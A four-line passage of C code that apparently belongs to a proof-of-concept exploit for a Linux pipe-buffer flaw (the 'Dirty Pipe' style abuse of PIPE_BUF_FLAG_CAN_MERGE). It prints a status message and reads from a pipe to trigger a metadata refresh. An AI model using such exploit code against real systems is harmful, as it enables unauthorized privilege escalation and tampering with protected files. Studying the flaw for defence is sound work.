    // but the buffer metadata is still there, and flags might be uninitialized (PIPE_BUF_FLAG_CAN_MERGE).
    printf("[*] Reading 1 byte from pipe to trigger metadata refresh...\n");
    char dummy_read_buf[1];
    if (read(p[0], dummy_read_buf, 1) < 0) {
